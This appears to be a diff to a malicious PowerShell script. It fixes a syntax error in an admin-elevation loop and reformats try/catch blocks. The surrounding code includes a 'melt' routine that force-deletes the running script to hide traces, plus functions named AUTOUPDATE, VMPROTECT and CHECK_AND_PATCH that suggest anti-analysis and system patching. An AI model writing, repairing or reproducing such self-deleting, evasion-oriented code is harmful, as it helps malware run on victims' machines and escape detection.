@@ -68,7 +68,8 @@ function AUTOUPDATE {
         if ($melt) { 
             try {
                 Remove-Item $pscommandpath -force
-            } catch {}
+            }
+            catch {}
         }
     }
     else {
@@ -126,7 +127,7 @@ function VMPROTECT {
 
 function Request-Admin {
     while (-not (CHECK_AND_PATCH)) {
-        if $PSCommandPath -eq $null {
+        if ($PSCommandPath -eq $null) {
             Write-Host "Please run the script with admin!" -ForegroundColor Red
             Start-Sleep -Seconds 5
             Exit 1
@@ -1188,7 +1189,8 @@ if (CHECK_AND_PATCH -eq $true) {
     if ($melt) { 
         try {
             Remove-Item $pscommandpath -force
-        } catch {}
+        }
+        catch {}
     }
 
 }
